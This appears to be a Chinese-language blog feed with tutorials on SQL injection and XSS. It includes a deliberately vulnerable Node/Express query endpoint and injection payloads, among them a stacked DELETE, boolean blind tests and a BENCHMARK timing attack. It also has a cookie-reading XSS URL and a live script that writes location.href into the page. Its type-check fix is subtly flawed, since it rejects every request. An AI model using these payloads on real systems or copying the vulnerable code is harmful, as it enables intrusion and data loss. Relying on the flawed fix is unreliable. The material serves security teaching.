class="attr">password</span>: <span class="string">&quot;********&quot;</span>,</span><br><span class="line">  <span class="attr">database</span>: <span class="string">&quot;test&quot;</span>, <span class="comment">//数据库名</span></span><br><span class="line">  <span class="attr">port</span>: <span class="number">3306</span>, <span class="comment">//端口号</span></span><br><span class="line">  <span class="attr">multipleStatements</span>: <span class="literal">true</span>, <span class="comment">// 允许执行多条执行语句</span></span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 跨域设置</span></span><br><span class="line">app.<span class="title function_">all</span>(<span class="string">&quot;*&quot;</span>, <span class="keyword">function</span> (<span class="params">req, res, next</span>) &#123;</span><br><span class="line">  <span class="comment">//设置允许跨域的域名，代表允许任意域名跨域</span></span><br><span class="line">  res.<span class="title function_">header</span>(<span class="string">&quot;Access-Control-Allow-Origin&quot;</span>, <span class="string">&quot;*&quot;</span>);</span><br><span class="line">  <span class="comment">//允许的header类型</span></span><br><span class="line">  res.<span class="title function_">header</span>(<span class="string">&quot;Access-Control-Allow-Headers&quot;</span>, <span class="string">&quot;content-type&quot;</span>);</span><br><span class="line">  <span class="comment">//跨域允许的请求方式</span></span><br><span class="line">  res.<span class="title function_">header</span>(<span class="string">&quot;Access-Control-Allow-Methods&quot;</span>, <span class="string">&quot;DELETE,PUT,POST,GET,OPTIONS&quot;</span>);</span><br><span class="line">  <span class="keyword">if</span> (req.<span class="property">method</span>.<span class="title function_">toLowerCase</span>() == <span class="string">&quot;options&quot;</span>)</span><br><span class="line">    res.<span class="title function_">send</span>(<span class="number">200</span>); <span class="comment">//让options尝试请求快速结束</span></span><br><span class="line">  <span class="keyword">else</span> <span class="title function_">next</span>();</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">app.<span class="title function_">get</span>(<span class="string">&quot;/getStudentById&quot;</span>, <span class="keyword">function</span> (<span class="params">req, res</span>) &#123;</span><br><span class="line">  <span class="keyword">var</span> sql = <span class="string">&quot;select * from student where id = &quot;</span> + req.<span class="property">query</span>.<span class="property">id</span>;</span><br><span class="line"></span><br><span class="line">  <span class="variable language_">console</span>.<span class="title function_">log</span>(sql);</span><br><span class="line">  <span class="comment">// 获取所有的数据</span></span><br><span class="line">  connection.<span class="title function_">query</span>(sql, <span class="keyword">function</span> (<span class="params">err, rows, fields</span>) &#123;</span><br><span class="line">    <span class="keyword">if</span> (err) &#123;</span><br><span class="line">      <span class="comment">// throw err</span></span><br><span class="line">      res.<span class="title function_">send</span>(err); <span class="comment">// 如果开启了错误回显</span></span><br><span class="line">      <span class="variable language_">console</span>.<span class="title function_">log</span>(err);</span><br><span class="line">    &#125;</span><br><span class="line">    res.<span class="title function_">send</span>(rows);</span><br><span class="line">  &#125;);</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">app.<span class="title function_">listen</span>(<span class="number">3000</span>, <span class="keyword">function</span> (<span class="params"></span>) &#123;</span><br><span class="line">  <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;服务已启动&quot;</span>);</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><p>其中关键语句:</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> sql = <span class="string">&quot;select * from student where id = &quot;</span> + req.<span class="property">query</span>.<span class="property">id</span>;</span><br></pre></td></tr></table></figure><p>SQL 语句是通过用户输入与现有字符拼接而成的，如果用户输入类似<code>1;delete from Student where id = 2</code>的查询字符，则会被拼接成</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x27;select * from student where id = 1;delete from Student where id = 2&#x27;</span><br></pre></td></tr></table></figure><p>然后被 query()方法执行。</p><p>虽然攻击者无从得知表名，在构造 SQL 时稍有困难，但是搜索并不会因为执行错误而禁止再次执行，所以攻击者可以无限猜测，风险仍然是存在的。另外，在上述的后台程序中，当 query()执行错误时，会把错误信息返回至请求结果中，攻击者则可以通过故意触发查询错误而获取敏感信息，假如搜索框中输入单引号<code>&#39;</code>并执行搜索，则返回如下信息：<br /><img src="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2020/png/1787397/1594913354842-dcf4f6ae-b929-418b-8125-0d2b28df36c9.png#height=320&id=wsJqz&originHeight=320&originWidth=1389&originalType=binary&ratio=1&rotation=0&showTitle=false&size=38159&status=done&style=none&title=&width=1389" class="lazyload placeholder" data-srcset="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2020/png/1787397/1594913354842-dcf4f6ae-b929-418b-8125-0d2b28df36c9.png#height=320&id=wsJqz&originHeight=320&originWidth=1389&originalType=binary&ratio=1&rotation=0&showTitle=false&size=38159&status=done&style=none&title=&width=1389" srcset="https://ossk.cc/file/c40b6c4ba22bbb6b6f944.gif" alt="5.png"></p><p>其中 sql 字段直接暴露了表名，也直接表明了该接口存在漏洞，会执行外部输入的 SQL 语句（正常的请求下应该根据<code>id=&#39;</code>进行搜索并返回空的数组）。</p><p><a name="8bfa7e6a"></a></p><h3 id="盲注攻击"><a href="#盲注攻击" class="headerlink" title="盲注攻击"></a>盲注攻击</h3><p>很多时候，服务器并不会直接把错误返回给 web，这样就避免了敏感信息的暴露并且使攻击者难以判断注入的 SQL 是否被执行。但是关闭了错误回显就能避免 SQL 攻击了吗？答案使否定的。</p><p>这里依然使用上述攻击例子的 web 网站来进行测试，我们在搜索框中输入<code>1 and 1=2</code>并且执行搜索:<br /><img src="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2020/png/1787397/1594913361087-7b9494b7-50f0-4c1c-ab08-23dff4627cd3.png#height=56&id=BAShA&originHeight=56&originWidth=373&originalType=binary&ratio=1&rotation=0&showTitle=false&size=2925&status=done&style=none&title=&width=373" class="lazyload placeholder" data-srcset="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2020/png/1787397/1594913361087-7b9494b7-50f0-4c1c-ab08-23dff4627cd3.png#height=56&id=BAShA&originHeight=56&originWidth=373&originalType=binary&ratio=1&rotation=0&showTitle=false&size=2925&status=done&style=none&title=&width=373" srcset="https://ossk.cc/file/c40b6c4ba22bbb6b6f944.gif" alt="6.png"></p><p>请求结果:<br /><img src="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2020/png/1787397/1594913365261-fba758b6-0aa2-41f1-8626-a7ef94d09e76.png#height=244&id=Vcqpx&originHeight=244&originWidth=662&originalType=binary&ratio=1&rotation=0&showTitle=false&size=20255&status=done&style=none&title=&width=662" class="lazyload placeholder" data-srcset="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2020/png/1787397/1594913365261-fba758b6-0aa2-41f1-8626-a7ef94d09e76.png#height=244&id=Vcqpx&originHeight=244&originWidth=662&originalType=binary&ratio=1&rotation=0&showTitle=false&size=20255&status=done&style=none&title=&width=662" srcset="https://ossk.cc/file/c40b6c4ba22bbb6b6f944.gif" alt="7.png"></p><p>可以看到搜索结果返回了一个空数组，这是正常的。然后继续在搜索框中输入<code>1 and 1=1</code>并且执行搜索:<img src="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2020/png/1787397/1594913378627-e03283e8-860c-4d80-8453-eb243c97bfae.png#height=51&id=qxJ2Z&originHeight=51&originWidth=353&originalType=binary&ratio=1&rotation=0&showTitle=false&size=2824&status=done&style=none&title=&width=353" class="lazyload placeholder" data-srcset="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2020/png/1787397/1594913378627-e03283e8-860c-4d80-8453-eb243c97bfae.png#height=51&id=qxJ2Z&originHeight=51&originWidth=353&originalType=binary&ratio=1&rotation=0&showTitle=false&size=2824&status=done&style=none&title=&width=353" srcset="https://ossk.cc/file/c40b6c4ba22bbb6b6f944.gif" alt="8.png"></p><p>请求结果:<br /><img src="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2020/png/1787397/1594913383906-b5cdfb1e-986c-45d7-a883-ce64390ecdc4.png#height=260&id=PoBOF&originHeight=260&originWidth=507&originalType=binary&ratio=1&rotation=0&showTitle=false&size=19744&status=done&style=none&title=&width=507" class="lazyload placeholder" data-srcset="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2020/png/1787397/1594913383906-b5cdfb1e-986c-45d7-a883-ce64390ecdc4.png#height=260&id=PoBOF&originHeight=260&originWidth=507&originalType=binary&ratio=1&rotation=0&showTitle=false&size=19744&status=done&style=none&title=&width=507" srcset="https://ossk.cc/file/c40b6c4ba22bbb6b6f944.gif" alt="9.png"></p><p>这次却不正常地返回了数据，由此可以猜测，第一次搜索<code>1 and 1=2</code>时，由于<code>1=2</code>永远不成立，导致 SQL 执行<code>and</code>的运算时错误，而搜索<code>1 and 1=1</code>时，<code>1=1</code>恒成立，SQL 正常执行，返回了搜索数据，所以可以判定此接口漏洞存在，能够注入 SQL 并执行。</p><p>除了上述通过页面请求结果差异化来判断是否存在 SQL 注入漏洞，还可以利用 SQL 执行时间的差异化进行判断，这类型的盲注攻击也称为 Timing Attack。</p><p>在 Mysql 数据库中，有一个 BENCHMARK()函数，它是用于测试函数性能的。它有两个参数：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">BENCHMARK(count, expr)</span><br></pre></td></tr></table></figure><p>函数实现的是将 expr 表达式执行 count 次。借此，我们利用该函数构造如下表达式：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> student <span class="keyword">where</span> id <span class="operator">=</span> <span class="number">1</span>; <span class="keyword">select</span> BENCHMARK(<span class="number">100000</span>, ENCODE(<span class="string">&#x27;timing&#x27;</span>, <span class="string">&#x27;attack&#x27;</span>))</span><br></pre></td></tr></table></figure><p>即需要在输入框中输入<code>1; select BENCHMARK(100000, ENCODE(&#39;timing&#39;, &#39;attack&#39;))</code>并执行:<br /><img src="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2020/png/1787397/1594913478686-0deade75-0d17-4f80-9e6c-3d4d9aab485b.png#height=54&id=nqgeX&originHeight=54&originWidth=353&originalType=binary&ratio=1&rotation=0&showTitle=false&size=3860&status=done&style=none&title=&width=353" class="lazyload placeholder" data-srcset="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2020/png/1787397/1594913478686-0deade75-0d17-4f80-9e6c-3d4d9aab485b.png#height=54&id=nqgeX&originHeight=54&originWidth=353&originalType=binary&ratio=1&rotation=0&showTitle=false&size=3860&status=done&style=none&title=&width=353" srcset="https://ossk.cc/file/c40b6c4ba22bbb6b6f944.gif" alt="10.png"></p><p>执行结果：<br /><img src="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2020/png/1787397/1594913487558-53b5f3a6-7324-4488-b1e4-f8ad4b223a28.png#height=424&id=JUbdD&originHeight=424&originWidth=554&originalType=binary&ratio=1&rotation=0&showTitle=false&size=21211&status=done&style=none&title=&width=554" class="lazyload placeholder" data-srcset="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2020/png/1787397/1594913487558-53b5f3a6-7324-4488-b1e4-f8ad4b223a28.png#height=424&id=JUbdD&originHeight=424&originWidth=554&originalType=binary&ratio=1&rotation=0&showTitle=false&size=21211&status=done&style=none&title=&width=554" srcset="https://ossk.cc/file/c40b6c4ba22bbb6b6f944.gif" alt="11.png"></p><p>可见，请求在 16.43ms 后执行完成。接着修改 BENCHMARK()的执行次数为 10000000 次:</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> student <span class="keyword">where</span> id <span class="operator">=</span> <span class="number">1</span>; <span class="keyword">select</span> BENCHMARK(<span class="number">10000000</span>, ENCODE(<span class="string">&#x27;timing&#x27;</span>, <span class="string">&#x27;attack&#x27;</span>))</span><br></pre></td></tr></table></figure><p><img src="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2020/png/1787397/1594913496375-c38e9efb-6c50-4d4a-95cb-71d1950200f1.png#height=431&id=aEaxU&originHeight=431&originWidth=550&originalType=binary&ratio=1&rotation=0&showTitle=false&size=21952&status=done&style=none&title=&width=550" class="lazyload placeholder" data-srcset="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2020/png/1787397/1594913496375-c38e9efb-6c50-4d4a-95cb-71d1950200f1.png#height=431&id=aEaxU&originHeight=431&originWidth=550&originalType=binary&ratio=1&rotation=0&showTitle=false&size=21952&status=done&style=none&title=&width=550" srcset="https://ossk.cc/file/c40b6c4ba22bbb6b6f944.gif" alt="12.png"></p><p>同样搜索目标为<code>id=1</code>的信息，请求返回的时间却相差巨大，由此也可以判断出该接口存在 SQL 注入漏洞。</p><p><a name="68027d5b"></a></p><h3 id="防御手段"><a href="#防御手段" class="headerlink" title="防御手段"></a>防御手段</h3><p>理论上来说，只要存在 SQL 注入漏洞，就有可能被成功攻击，反过来说就是，只要消灭 SQL 注入漏洞，被成功攻击的可能性就更低。所以我们 SQL 注入防御工程需要做一下两件事:</p><ol><li>找到所有的 SQL 注入漏洞;</li><li>修补这些漏洞。</li></ol><p>做好以上两件事，就能有效防御 SQL 注入攻击。做好防御工程并不是一件容易的事情，下面介绍有哪些常用的防御手段。</p><p><a name="42ed45ab"></a></p><h4 id="使用预编译语句"><a href="#使用预编译语句" class="headerlink" title="使用预编译语句"></a>使用预编译语句</h4><p>预编译语句的工作原理：</p><ol><li>预处理：创建 SQL 语句模板并发送到数据库。预留的值使用参数 “?” 标记 。例如：</li></ol><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">INSERT</span> <span class="keyword">INTO</span> myCity (Name, CountryCode, District) <span class="keyword">VALUES</span> (?, ?, ?)</span><br></pre></td></tr></table></figure><ol start="2"><li>数据库解析，编译，对 SQL 语句模板执行查询优化，并存储结果不输出。</li><li>执行：最后，将应用绑定的值传递给参数（”?” 标记），数据库执行语句。<br />例如在 PHP 中这样使用：</li></ol><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$query</span> = <span class="string">&quot;INSERT INTO myCity (Name, CountryCode, District) VALUES (?, ?, ?)&quot;</span>; <span class="comment">// 定义预编译语句, 预留？？？分别对应Name, CountryCode, District变量</span></span><br><span class="line"><span class="variable">$stmt</span> = <span class="variable">$mysqli</span>-&gt;<span class="title function_ invoke__">prepare</span>(<span class="variable">$query</span>); <span class="comment">// mysql解析</span></span><br><span class="line"><span class="variable">$stmt</span>-&gt;<span class="title function_ invoke__">bind_param</span>(<span class="string">&quot;sss&quot;</span>, <span class="variable">$val1</span>, <span class="variable">$val2</span>, <span class="variable">$val3</span>);</span><br><span class="line"><span class="variable">$val1</span> = <span class="string">&#x27;Stuttgart&#x27;</span>; <span class="comment">// 赋值</span></span><br><span class="line"><span class="variable">$val2</span> = <span class="string">&#x27;DEU&#x27;</span>;</span><br><span class="line"><span class="variable">$val3</span> = <span class="string">&#x27;Baden-Wuerttemberg&#x27;</span>;</span><br><span class="line"><span class="variable">$stmt</span>-&gt;<span class="title function_ invoke__">execute</span>(); <span class="comment">// 执行语句</span></span><br></pre></td></tr></table></figure><p><br />使用预编译的 SQL 语句，SQL 语句的语义不会发生改变。在 SQL 语句中，变量用？表示，攻击者无法改变 SQL 的结构。</p><p><a name="ed5cd509"></a></p><h4 id="使用存储过程"><a href="#使用存储过程" class="headerlink" title="使用存储过程"></a>使用存储过程</h4><p>使用存储过程的效果和使用预编语句译类似，其区别就是存储过程需要先将 SQL 语句定义在数据库中。但需要注意的是，存储过程中也可能会存在注入问题，因此应该尽量避免在存储过程内使用动态的 SQL 语句。如果无法避免，则应该使用严格的输入过滤或者是编码函数来处理用户的输入数据。</p><p><a name="0937fe74"></a></p><h4 id="检查数据类型"><a href="#检查数据类型" class="headerlink" title="检查数据类型"></a>检查数据类型</h4><p>检查用户输入，严格控制数据格式在某种程度上来说，也可以有限防御 SQL 攻击。</p><p>例如在文章最开始的攻击举例中，id 字段应该是一个 integer 类型的数据，所以只需在接收参数的处理函数稍加处理:</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">app.<span class="title function_">get</span>(<span class="string">&quot;/getStudentById&quot;</span>, <span class="keyword">function</span> (<span class="params">req, res</span>) &#123;</span><br><span class="line">  <span class="keyword">if</span> (<span class="keyword">typeof</span> req.<span class="property">query</span>.<span class="property">id</span> !== <span class="string">&quot;number&quot;</span>) &#123;</span><br><span class="line">    res.<span class="title function_">send</span>(&#123;</span><br><span class="line">      <span class="attr">status</span>: <span class="title class_">Status</span>.<span class="property">Error</span>,</span><br><span class="line">      <span class="attr">message</span>: <span class="string">&quot;请输入正确的数据格式！&quot;</span>,</span><br><span class="line">      <span class="attr">data</span>: <span class="literal">null</span>,</span><br><span class="line">    &#125;);</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">var</span> sql = <span class="string">`select * from student where id = <span class="subst">$&#123;req.query.id&#125;</span>`</span>;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// 获取所有的数据</span></span><br><span class="line">  connection.<span class="title function_">query</span>(sql, <span class="keyword">function</span> (<span class="params">err, rows, fields</span>) &#123;</span><br><span class="line">    <span class="comment">/*... code ...*/</span></span><br><span class="line">  &#125;);</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><p>经过格式检查的处理后，该接口的 SQL 漏洞直接消失殆尽，因为单纯的 integer 数据无法构造出 SQL 语句。不过总有需要用户输入字符串作为数据的时候，这时限制数据类型为字符串并不能有效消灭 SQL 漏洞，这时就需要使用安全编码函数。</p><p><a name="73821367"></a></p><h4 id="使用安全函数"><a href="#使用安全函数" class="headerlink" title="使用安全函数"></a>使用安全函数</h4><p>使用安全编码函数对用户输入数据按照黑名单原则进行敏感字符进行转义编码，也能有效地减少 SQL 注入攻击，一般数据库厂商都会给出黑名单指导意见。例如在 Mysql 中，厂商建议按照一下思路进行编码字符:</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">NUL (0x00) --&gt; \0 BS (0x08) --&gt; \b TAB (0x09) --&gt; \t LF (0x0a) --&gt; \n CR (0x0d)</span><br><span class="line">--&gt; \r SUB (0x1a) --&gt; \z &quot; (0x22) --&gt; \&quot; % (0x25) --&gt; \% &#x27; (0x27) --&gt; \&#x27; \</span><br><span class="line">(0x5c) --&gt; \\ _ (0x5f) --&gt; \_</span><br></pre></td></tr></table></figure><p><a name="45adcc85"></a></p><h4 id="最小权限原则"><a href="#最小权限原则" class="headerlink" title="最小权限原则"></a>最小权限原则</h4><p>在最后，从数据库自身的角度来说，应该使用最小权限原则，避免 Web 应用直接使用 root、dbowner 等高权限账户直接连接数据库。如果有多个不同的应用在使用同一个数据库，则也应该为每个应用分配不同的账户。Web 应用使用的数据库账户，不应该有创建自定义函数、操作本地文件的权限。</p><p><a name="25f9c7fa"></a></p><h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><p>安全问题就是信任问题，注入攻击是过于信任用户输入的结果，也违背了“数据与代码分离原则”。它有两个条件：一是用户能够控制数据的输入；二是代码拼凑了用户输入的数据，把数据当做代码执行了。在编写代码时，保持“一切不可信任”的思想，在用户交互需要输入数据的地方加强安全检查，尤其是当用户数据需要拼接代码时，如此以往就能有效减少注入漏洞。</p><p><a href="https://redtiger.labs.overthewire.org/">练习</a> — <a href="https://blog.spoock.com/2016/07/25/redtiger-writeup/">解答</a></p><script type="text&#x2F;javascript" src="https://unpkg.com/kity@2.0.4/dist/kity.min.js"></script><script type="text&#x2F;javascript" src="https://unpkg.com/kityminder-core@1.4.50/dist/kityminder.core.min.js"></script><script defer="true" type="text&#x2F;javascript" src="https://unpkg.com/hexo-simple-mindmap@0.8.0/dist/mindmap.min.js"></script><link rel="stylesheet" type="text&#x2F;css" href="https://unpkg.com/hexo-simple-mindmap@0.8.0/dist/mindmap.min.css">]]></content>
      
      
      <categories>
          
          <category> 前端 </category>
          
          <category> 网络安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 前端 </tag>
            
            <tag> 网络安全 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>XSS攻击</title>
      <link href="/2023/06/29/frontend/security/xss-gong-ji/"/>
      <url>/2023/06/29/frontend/security/xss-gong-ji/</url>
      
        <content type="html"><![CDATA[<meta name="referrer" content="no-referrer" /><p>一、XSS (Cross-Site Scripting)，跨站脚本攻击，因为缩写和 CSS 重叠，所以只能叫 XSS。</p><p><a name="e23PT"></a></p><h1 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h1><p>不需要你做任何的登录认证，它会通过合法的操作（如在 url 输入，在评论框中输入），向你的页面注入脚本（可能是 js， html 代码块等），当用户浏览该页时，嵌入 web 的脚本代码被执行，从而完成攻击。</p><p><a name="bTm82"></a></p><h1 id="影响"><a href="#影响" class="headerlink" title="影响"></a>影响</h1><p>一、跨站脚本攻击有可能造成以下影响:</p><ol><li>利用虚假输入表单骗取用户个人信息。</li><li>利用脚本窃取用户的 Cookie 值，被害者在不知情的情况下，帮助攻击者发送恶意请求。</li><li>显示伪造的文章或图片。</li></ol><p><a name="VCbe1"></a></p><h1 id="XSS-攻击手段-x2F-类型"><a href="#XSS-攻击手段-x2F-类型" class="headerlink" title="XSS 攻击手段&#x2F;类型"></a>XSS 攻击手段&#x2F;类型<br /><br /></h1><p><a name="SDETv"></a></p><h2 id="持久型-XSS-x2F-存储型-XSS"><a href="#持久型-XSS-x2F-存储型-XSS" class="headerlink" title="持久型 XSS &#x2F; 存储型 XSS"></a>持久型 XSS &#x2F; 存储型 XSS</h2><p>一、表单提交的数据存在恶意代码，被保存到目标网站的服务器中，当前端页面获得后端从数据库中读取的注入代码时，恰好将其渲染执行。</p><p><img src="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2022/png/355497/1646902031365-de7abdd2-c581-43e6-a1b0-57beeeedd804.png" class="lazyload placeholder" data-srcset="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2022/png/355497/1646902031365-de7abdd2-c581-43e6-a1b0-57beeeedd804.png" srcset="https://ossk.cc/file/c40b6c4ba22bbb6b6f944.gif"></p><table><thead><tr><th>【示例】举个例子，对于评论功能来说，就得防范持久型 XSS 攻击，因为我可以在评论中输入以下内容</th></tr></thead></table><p><img src="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2022/png/355497/1657002654728-fdd8642f-409b-42ef-9d15-9433b09b4fb0.png" class="lazyload placeholder" data-srcset="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2022/png/355497/1657002654728-fdd8642f-409b-42ef-9d15-9433b09b4fb0.png" srcset="https://ossk.cc/file/c40b6c4ba22bbb6b6f944.gif"></p><p>二、主要注入页面方式和非持久型 XSS 漏洞类似，只不过持久型的不是来源于 URL，referer，forms 等，而是来源于后端从数据库中读出来的数据 。持久型 XSS 攻击不需要诱骗点击，黑客只需要在提交表单的地方完成注入即可，但是这种 XSS 攻击的成本相对还是很高。<br><a name="wlKrS"></a></p><h3 id="存储型-XSS-的条件"><a href="#存储型-XSS-的条件" class="headerlink" title="存储型 XSS 的条件"></a>存储型 XSS 的条件</h3><p>攻击成功需要同时满足以下<strong>几个条件</strong>：<br />●POST 请求提交表单后端没做转义直接入库。<br />● 后端从数据库中取出数据没做转义直接输出给前端。<br />● 前端拿到后端数据没做转义直接渲染成 DOM。<br><a name="OcFm2"></a></p><h3 id="存储型-XSS-的特点"><a href="#存储型-XSS-的特点" class="headerlink" title="存储型 XSS 的特点"></a>存储型 XSS 的特点</h3><p>持久型 XSS 有以下<strong>几个特点</strong>：<br />● 持久性，植入在数据库(DB)中<br />● 盗取用户敏感私密信息<br />● 危害面广<br><a name="m78g8"></a></p><h3 id="存储型-XSS-的攻击步骤"><a href="#存储型-XSS-的攻击步骤" class="headerlink" title="存储型 XSS 的攻击步骤"></a>存储型 XSS 的攻击步骤</h3><p>存储型 XSS 的攻击步骤如下：<br /> 1. 攻击者将恶意代码提交到目标网站数据库中。<br /> 2. 用户打开目标网站时，网站服务器将恶意代码从数据库中取出，然后拼接到 html 中返回给浏览器中。 <br /> 3. 用户浏览器接收到响应后解析执行，那么其中的恶意代码也会被执行。<br /> 4. 那么恶意代码执行后，就能获取到用户数据，比如上面的 cookie 等信息，那么把该 cookie 发送到攻击者网站中，那么攻击者拿到该 cookie 然后会冒充该用户的行为，调用目标网站接口等违法操作。<br><a name="s3v2h"></a></p><h3 id="存储型-XSS-的防范"><a href="#存储型-XSS-的防范" class="headerlink" title="存储型 XSS 的防范"></a>存储型 XSS 的防范</h3><p>如何防范 ：<br /> 1. 后端需要对提交的数据进行过滤。 <br /> 2. 前端也可以做一下处理方式，比如对 script 标签，将特殊字符替换成 HTML 编码这些等。<br /> 3. 前端避免直接渲染，先转为文本</p><p><a name="p985j"></a></p><h2 id="非持久型-XSS"><a href="#非持久型-XSS" class="headerlink" title="非持久型 XSS"></a>非持久型 XSS<br /><br /></h2><p><a name="Utwut"></a></p><h3 id="反射型-XSS"><a href="#反射型-XSS" class="headerlink" title="反射型 XSS"></a>反射型 XSS</h3><p>一、发出请求时，xss 代码出现在 url 中，作为输入提交到服务器端，服务器端解析后响应，xss 代码随响应内容一起传回给浏览器，然后浏览器解析执行 xss 代码。</p><p>1、为什么叫反射型 XSS？<br />因为这种攻击方式的注入代码是从目标服务器通过错误信息，搜索结果等方式反射回来的。</p><p>2、为什么叫非持久性 XSS？<br />因为这种攻击方式只有一次性。</p><p><img src="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2021/png/355497/1625561048339-91047d00-09ac-4f3d-8944-a4daaf0b43f1.png" class="lazyload placeholder" data-srcset="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2021/png/355497/1625561048339-91047d00-09ac-4f3d-8944-a4daaf0b43f1.png" srcset="https://ossk.cc/file/c40b6c4ba22bbb6b6f944.gif"></p><p>| 【示例】页面中含如下代码，攻击者可以直接通过 URL (类似：<a href="https://xxx.com/xxx?default=">https://xxx.com/xxx?default=</a><script>alert(document.cookie)</script>) 注入可执行的脚本代码。不过一些浏览器如 Chrome 其内置了一些 XSS 过滤器，可以防止大部分反射型 XSS 攻击。&#96;&#96;&#96;javascript<br><select></p>  <script>      document.write(''                     + '<option value=1>'                     +     location.href.substring(location.href.indexOf('default=') + 8)                     + '</option>'                    );      document.write('<option value=2>English</option>');  </script></select><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span 